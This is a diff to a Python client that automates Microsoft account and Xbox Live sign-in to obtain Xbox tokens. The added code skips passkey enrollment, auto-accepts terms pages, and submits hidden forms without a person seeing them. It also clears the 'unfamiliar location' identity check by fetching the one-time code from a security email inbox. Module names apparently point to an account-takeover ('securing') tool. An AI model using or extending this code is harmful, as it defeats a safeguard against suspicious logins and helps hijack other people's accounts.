@@ -155,6 +155,111 @@ def _is_auto_submit_bridge(html: str, page_url: str = "") -> bool:
     return False
 
 
+async def _skip_fido_create(
+    session: httpx.AsyncClient,
+    html: str,
+    page_url: str,
+) -> httpx.Response | None:
+    """Passkey enrollment interrupt. Skip by following postBackUrl's ru=."""
+    if "fido/create" not in (page_url or "").lower() and "createfido" not in (html or "").lower():
+        return None
+    post_m = re.search(
+        r"""name=['"]postBackUrl['"]\s+value=['"]([^'"]+)['"]""",
+        html or "",
+        re.I,
+    )
+    if not post_m:
+        post_m = re.search(r'"postBackUrl"\s*:\s*"([^"]+)"', html or "")
+    if not post_m:
+        return None
+    target = html_lib.unescape(post_m.group(1).replace("&amp;", "&"))
+    ru_m = re.search(r"[?&]ru=([^&\"']+)", target)
+    if not ru_m:
+        return None
+    skip = unquote(ru_m.group(1))
+    print("[~] - skipping passkey enrollment interrupt")
+    return await session.get(skip, follow_redirects=False)
+
+
+async def _accept_tou_accrue(
+    session: httpx.AsyncClient,
+    html: str,
+    page_url: str,
+) -> httpx.Response | None:
+    """account.live.com/tou/accrue is a JS page with no form. Accept posts the canary."""
+
+    def grab(key: str) -> str:
+        m = re.search(rf'"{key}"\s*:\s*"((?:\\.|[^"\\])*)"', html or "")
+        if not m:
+            return ""
+        try:
+            return bytes(m.group(1), "utf-8").decode("unicode_escape")
+        except Exception:
+            return m.group(1)
+
+    canary = grab("sCanary") or grab("apiCanary")
+    token = grab("sAuthenticationToken")
+    if not canary or not token:
+        return None
+    print("[~] - accepting Xbox terms interrupt")
+    return await session.post(
+        page_url,
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "canary": canary,
+        },
+        data={
+            "canary": canary,
+            "sCanary": canary,
+            "sAuthenticationToken": token,
+            "accept": "Yes",
+        },
+        follow_redirects=False,
+    )
+
+
+async def _post_hidden_form(
+    session: httpx.AsyncClient,
+    html: str,
+    page_url: str,
+) -> httpx.Response | None:
+    """POST whatever auto-continue form the page actually rendered."""
+    if _is_identity_confirm(page_url, html):
+        return None
+    action = _extract_form_action(html, page_url)
+    fields = _extract_hidden_fields(html)
+    if not action or not fields:
+        return None
+    data = {k: v for k, v in fields.items() if k.lower() not in {"submit"}}
+    agree = re.search(
+        r'name="([^"]+)"[^>]*(?:value="(?:Yes|Accept|I agree|Next)")',
+        html,
+        re.I,
+    )
+    if agree and agree.group(1) not in data:
+        val = re.search(
+            rf'name="{re.escape(agree.group(1))}"[^>]*value="([^"]*)"',
+            html,
+            re.I,
+        )
+        data[agree.group(1)] = val.group(1) if val else "Yes"
+    if "tou/accrue" in (page_url + action).lower() and "accept" not in {k.lower() for k in data}:
+        data["accept"] = "Yes"
+    if not data:
+        return None
+    log.info(
+        "get_xbl: posting follow-up form → %s fields=%s",
+        action[:180],
+        list(data)[:8],
+    )
+    return await session.post(
+        action,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        data=data,
+        follow_redirects=False,
+    )
+
+
 async def _post_auto_submit_bridge(
     session: httpx.AsyncClient,
     html: str,
@@ -232,6 +337,52 @@ def _kmsi_payload(text: str) -> tuple[str, str] | None:
     if url_m and sft_m:
         return url_m.group(1), sft_m.group(1)
     return None
+
+
+def _uescape_html(text: str) -> str:
+    return re.sub(
+        r"\\u([0-9a-fA-F]{4})",
+        lambda m: chr(int(m.group(1), 16)),
+        text or "",
+    )
+
+
+def _is_identity_confirm(url: str, html: str = "") -> bool:
+    u = (url or "").lower()
+    if "identity/confirm" in u:
+        return True
+    t = (html or "").lower()
+    return "identity/confirm" in t and "verify your account" in t
+
+
+def _identity_return_url(html: str) -> str | None:
+    text = _uescape_html(html or "")
+    m = re.search(r'"return"\s*:\s*\{\s*"url"\s*:\s*"([^"]+)"', text)
+    if not m:
+        return None
+    return m.group(1).replace("\\u0026", "&").replace("\\/", "/")
+
+
+def _identity_email_proof(html: str, security_email: str | None) -> tuple[str, str] | None:
+    text = _uescape_html(html or "")
+    proofs = re.findall(
+        r'"channel":"(Email|SMS)","epid":"(.*?)","lastUsed":(true|false),"name":"(.*?)"',
+        text,
+    )
+    emails = [
+        (epid.replace("\\/", "/"), name)
+        for ch, epid, _last, name in proofs
+        if ch == "Email" and epid
+    ]
+    if not emails:
+        return None
+    if security_email and "@" in security_email:
+        local, domain = security_email.lower().split("@", 1)
+        for epid, name in emails:
+            obs = name.lower()
+            if domain in obs and (not local or obs.startswith(local[:2])):
+                return epid, name
+    return emails[0]
 
 
 def _skip_url_from_html(text: str) -> str | None:
@@ -542,6 +693,124 @@ async def _follow_location(
         url = urljoin(str(current.url), loc)
         current = await session.get(url, follow_redirects=False)
     return current
+
+
+async def _complete_identity_confirm(
+    session: httpx.AsyncClient,
+    html: str,
+    page_url: str,
+    security_email: str,
+) -> httpx.Response:
+    """Unfamiliar-location identity/confirm: SendOtt → email OTP → VerifyCode."""
+    from securing.utils.cookies.get_email_code import get_email_code
+
+    text = _uescape_html(html or "")
+    picked = _identity_email_proof(html, security_email)
+    if not picked:
+        raise TransientMCError("identity/confirm has no email proof")
+    epid, shown = picked
+    api_canary = _cfg_str(text, "apiCanary") or _cfg_str(html, "apiCanary") or ""
+    if not api_canary:
+        raise TransientMCError("identity/confirm missing apiCanary")
+    uaid = _cfg_str(text, "uaid") or _cfg_str(html, "uaid") or ""
+    if not uaid:
+        qs = parse_qs(urlparse(page_url).query)
+        uaid = (qs.get("uaid") or [""])[0]
+    scid = int(_cfg_str(text, "scid") or _cfg_str(html, "scid") or "100166")
+    hpgid = int(_cfg_str(text, "hpgid") or _cfg_str(html, "hpgid") or "200355")
+    uiflvr = int(_cfg_str(text, "uiflvr") or _cfg_str(html, "uiflvr") or "1001")
+    purpose = "UnfamiliarLocationHard"
+
+    def _api_headers(canary: str) -> dict:
+        return {
+            "Content-Type": "application/json; charset=utf-8",
+            "Accept": "application/json",
+            "Origin": "https://account.live.com",
+            "Referer": page_url,
+            "canary": canary,
+            "hpgid": str(hpgid),
+            "hpgact": "0",
+            "scid": str(scid),
+            "uaid": uaid,
+            "uiflvr": str(uiflvr),
+            "x-ms-apiTransport": "xhr",
+            "x-ms-apiVersion": "2",
+        }
+
+    since = time.time()
+    send_body = {
+        "autoVerification": False,
+        "confirmProof": security_email,
+        "epid": epid.replace("\\/", "/"),
+        "proofRequiredReentry": 1,
+        "purpose": purpose,
+        "scid": scid,
+        "uaid": uaid,
+        "uiflvr": uiflvr,
+        "hpgid": hpgid,
+    }
+    send_headers = _api_headers(api_canary)
+    send_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+    send = await session.post(
+        _SEND_OTT_URL,
+        content=json.dumps(send_body),
+        headers=send_headers,
+    )
+    try:
+        send_json = send.json()
+    except Exception as exc:
+        raise TransientMCError(
+            f"identity/confirm SendOtt non-JSON status={send.status_code}"
+        ) from exc
+    if not isinstance(send_json, dict) or (
+        send_json.get("error") and not send_json.get("apiCanary")
+    ):
+        err = send_json.get("error") if isinstance(send_json, dict) else send_json
+        raise TransientMCError(f"identity/confirm SendOtt failed: {err}")
+    if isinstance(send_json.get("apiCanary"), str) and send_json["apiCanary"]:
+        api_canary = send_json["apiCanary"]
+    print(f"[~] - identity/confirm OTP sent to {shown}")
+    code = await get_email_code(security_email, timeout=90, since=since)
+    if not code:
+        raise TransientMCError(
+            f"identity/confirm OTP did not arrive at {security_email}"
+        )
+    print("[+] - identity/confirm OTP received")
+    verify_headers = _api_headers(api_canary)
+    verify_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+    verify = await session.post(
+        "https://account.live.com/API/Proofs/VerifyCode",
+        content=json.dumps({
+            "code": code,
+            "action": "IptVerify",
+            "purpose": purpose,
+            "epid": epid.replace("\\/", "/"),
+            "confirmProof": security_email,
+        }),
+        headers=verify_headers,
+    )
+    try:
+        verify_json = verify.json()
+    except Exception as exc:
+        raise TransientMCError(
+            f"identity/confirm VerifyCode non-JSON status={verify.status_code}"
+        ) from exc
+    if isinstance(verify_json, dict) and verify_json.get("error") and not verify_json.get("token"):
+        raise TransientMCError(f"identity/confirm VerifyCode failed: {verify_json.get('error')}")
+    if isinstance(verify_json, dict) and isinstance(verify_json.get("apiCanary"), str):
+        api_canary = verify_json["apiCanary"] or api_canary
+    print("[+] - identity/confirm VerifyCode accepted")
+    token = _token_from_response(verify)
+    if token:
+        return verify
+    loc = verify.headers.get("Location")
+    if loc:
+        return await _follow_location(session, verify)
+    return_url = _identity_return_url(html)
+    if not return_url:
+        raise TransientMCError("identity/confirm verified but no return URL")
+    nxt = await session.get(return_url, follow_redirects=False)
+    return await _follow_location(session, nxt)
 
 
 async def _complete_catb_with_otp(
@@ -905,6 +1174,41 @@ async def _follow_sisu(
             if loc2:
                 url = urljoin(str(post.url), loc2)
                 continue
+            if _is_identity_confirm(str(post.url), post.text or ""):
+                if not security_email:
+                    raise TransientMCError(
+                        "identity/confirm during Xbox SSO but no security email"
+                    )
+                print(
+                    "[~] - identity/confirm during Xbox SSO — "
+                    "completing via security-email OTP"
+                )
+                post = await _complete_identity_confirm(
+                    session,
+                    post.text or "",
+                    str(post.url),
+                    security_email,
+                )
+                token = _token_from_response(post)
+                if token:
+                    return _decode_xbl(token)
+                loc2 = post.headers.get("Location")
+                if loc2:
+                    url = urljoin(str(post.url), loc2)
+                    continue
+            body_after = post.text or ""
+            if _is_auto_submit_bridge(body_after, str(post.url)):
+                bridged = await _post_auto_submit_bridge(
+                    session, body_after, str(post.url)
+                )
+                token = _token_from_response(bridged)
+                if token:
+                    return _decode_xbl(token)
+                locb = bridged.headers.get("Location")
+                if locb:
+                    url = urljoin(str(bridged.url), locb)
+                    continue
+                post = bridged
             sso2 = _sso_payload(post.text or "", str(post.url))
             if sso2:
                 action2, fields2 = sso2
@@ -944,8 +1248,60 @@ async def _follow_sisu(
                 if loc3:
                     url = urljoin(str(post2.url), loc3)
                     continue
+            for _step in range(5):
+                if "tou/accrue" in str(post.url).lower():
+                    nxt = await _accept_tou_accrue(
+                        session, post.text or "", str(post.url)
+                    )
+                    if nxt is None:
+                        break
+                    post = nxt
+                elif "fido/create" in str(post.url).lower() or "CreateFido" in (post.text or ""):
+                    nxt = await _skip_fido_create(
+                        session, post.text or "", str(post.url)
+                    )
+                    if nxt is None:
+                        break
+                    post = nxt
+                elif _is_identity_confirm(str(post.url), post.text or ""):
+                    if not security_email:
+                        break
+                    print(
+                        "[~] - identity/confirm during Xbox SSO — "
+                        "completing via security-email OTP"
+                    )
+                    post = await _complete_identity_confirm(
+                        session,
+                        post.text or "",
+                        str(post.url),
+                        security_email,
+                    )
+                else:
+                    nxt = await _post_hidden_form(
+                        session, post.text or "", str(post.url)
+                    )
+                    if nxt is None or (nxt.text or "") == (post.text or ""):
+                        break
+                    post = nxt
+                token = _token_from_response(post)
+                if token:
+                    return _decode_xbl(token)
+                loc_step = post.headers.get("Location")
+                if loc_step:
+                    url = urljoin(str(post.url), loc_step)
+                    break
+            if post.headers.get("Location"):
+                continue
+            body2 = post.text or ""
+            page_id2 = re.search(r'PageID" content="([^"]+)"', body2)
+            title2 = re.search(r"<title[^>]*>(.*?)</title>", body2, re.I | re.S)
+            title2s = (
+                re.sub(r"\s+", " ", title2.group(1)).strip()[:80] if title2 else "?"
+            )
             raise TransientMCError(
-                f"sisu SSO form did not yield accessToken (status={post.status_code})"
+                f"sisu SSO form did not yield accessToken (status={post.status_code} "
+                f"pageId={(page_id2.group(1) if page_id2 else None)!r} title={title2s!r} "
+                f"url={str(post.url)[:160]})"
             )
 
         kmsi = _kmsi_payload(body)
@@ -966,6 +1322,25 @@ async def _follow_sisu(
                 url = urljoin(str(post.url), loc2)
                 continue
             raise TransientMCError("sisu KMSI did not yield accessToken")
+
+        sid_m = re.search(r"[?&#]sid=([A-Za-z0-9]+)", page_url) or re.search(
+            r"[?&#]sid=([A-Za-z0-9]+)", body
+        )
+        if sid_m and "sisu.xboxlive.com/client/" in page_url:
+            proxy_url = "https://sisu.xboxlive.com/proxy?sessionid=" + sid_m.group(1)
+            log.info("get_xbl: reading sisu client session %s", sid_m.group(1)[:12])
+            proxied = await session.get(proxy_url, follow_redirects=False)
+            token = _token_from_response(proxied)
+            if not token and proxied.headers.get("Location"):
+                token = _extract_access_token(proxied.headers.get("Location") or "")
+            if not token:
+                token = _extract_access_token(proxied.text or "")
+            if token:
+                return _decode_xbl(token)
+            locp = proxied.headers.get("Location")
+            if locp:
+                url = urljoin(str(proxied.url), locp)
+                continue
 
         page_id = re.search(r'PageID" content="([^"]+)"', body)
         title_m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
